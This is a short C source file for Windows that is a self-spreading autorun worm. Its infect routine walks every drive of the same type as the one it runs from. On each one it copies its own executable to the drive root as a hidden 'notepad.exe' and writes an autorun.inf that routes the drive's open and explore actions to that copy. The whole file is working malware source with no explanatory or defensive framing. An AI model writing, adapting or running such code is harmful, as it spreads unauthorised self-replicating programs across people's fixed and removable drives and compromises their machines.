#include <windows.h>
#include <stdio.h>


char szAutoRun[] = "[AutoRun]\
\r\nopen=notepad.exe\
\r\nshell\\open=打开(&O)\
\r\nshell\\open\\Command=notepad.exe\
\r\nshell\\explorer=资源管理器(&X)\
\r\nshell\\explorer\\Command=notepad.exe\
\r\nshell\\execute=notepad.exe\
\r\nshell\\Auto\\Command=notepad.exe";

void infect(char * lpFileName, UINT uDriveType)
{
	char szDriveString[MAXBYTE]={0};
	DWORD dwRet= 0;
	DWORD iNum = 0;
	char szRoot[4]={0};
	UINT uType = 0;
	char szTarget[MAX_PATH]={0};
	dwRet = GetLogicalDriveStrings(MAXBYTE, szDriveString);
	while (iNum<dwRet)
	{
		strncpy(szRoot, &szDriveString[iNum], 3);
		uType = GetDriveType(szRoot);
		if (uType==uDriveType)
		{
			lstrcpy(szTarget, szRoot);
			lstrcat(szTarget, "notepad.exe");
			CopyFile(lpFileName, szTarget, FALSE);
			SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);
			lstrcpy(szTarget, szRoot);
			lstrcat(szTarget, "autorun.inf");
			HANDLE hFile = CreateFile(szTarget, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			DWORD dwWritten = 0;
			WriteFile(hFile, szAutoRun, lstrlen(szAutoRun), &dwWritten, NULL);
			CloseHandle(hFile);
		}
		iNum+=4;
	}

}


int main()
{
	char szFileName [MAX_PATH]={0};
	char szRoot[4] = {0};
	UINT uType= 0;
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	strncpy(szRoot, szFileName, 3);
	uType = GetDriveType(szRoot);
	switch(uType)
	{
		case DRIVE_FIXED:
			infect(szFileName, DRIVE_FIXED);
			break;
		case DRIVE_REMOVABLE:
			infect(szFileName, DRIVE_REMOVABLE);
			break;
	}
	char ch = getchar();
	return 0;
}